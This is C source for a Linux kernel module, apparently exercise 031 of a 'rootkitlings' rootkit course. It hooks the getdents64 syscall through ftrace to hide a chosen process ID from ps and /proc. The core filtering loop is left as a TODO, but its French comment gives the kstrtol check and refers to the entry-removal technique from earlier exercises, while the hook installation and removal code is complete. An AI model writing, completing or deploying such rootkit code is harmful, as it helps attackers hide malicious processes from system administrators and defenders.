#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/string.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("031: hide a process from ps");

static int target_pid = 0;
module_param(target_pid, int, 0644);
MODULE_PARM_DESC(target_pid, "PID to hide from ps/proc listing");

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent_buf =
        (struct linux_dirent64 __user *)regs->si;
    long ret;
    struct linux_dirent64 *kbuf, *cur, *prev;
    unsigned long offset;

    ret = orig_getdents64(regs);
    if (ret <= 0 || target_pid == 0)
        return ret;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirent_buf, ret)) {
        kfree(kbuf);
        return ret;
    }

    prev = NULL;
    offset = 0;

    while (offset < ret) {
        cur = (struct linux_dirent64 *)((char *)kbuf + offset);
        unsigned short reclen = cur->d_reclen;

        // TODO(rootkitlings): verifie si d_name est un nombre (utilise kstrtol).
        //   Si c'est un nombre ET qu'il correspond a target_pid, retire
        //   l'entree du buffer (meme technique que 029/030).
        //   Sinon, avance prev.
        //
        //   Pour convertir: long pid_val;
        //                    if (kstrtol(cur->d_name, 10, &pid_val) == 0 && pid_val == target_pid)
        //
        //   ~8 lignes.

        offset += reclen;
    }

    if (copy_to_user(dirent_buf, kbuf, ret))
        pr_err("rootkitlings/031: copy_to_user failed\n");

    kfree(kbuf);
    return ret;
}

static struct fthelper_hook hook = {
    .name = "__x64_sys_getdents64",
    .hook_fn = hook_getdents64,
    .orig_fn = &orig_getdents64,
};

static int __init hideproc_init(void)
{
    int ret;

    if (target_pid == 0) {
        pr_warn("rootkitlings/031: no target_pid set, load with target_pid=<PID>\n");
    }

    pr_info("rootkitlings/031: installing getdents64 hook, hiding PID %d\n",
            target_pid);
    ret = fthelper_install(&hook);
    if (ret)
        return ret;

    return 0;
}

static void __exit hideproc_exit(void)
{
    fthelper_remove(&hook);
    pr_info("rootkitlings/031: hook removed\n");
}

module_init(hideproc_init);
module_exit(hideproc_exit);
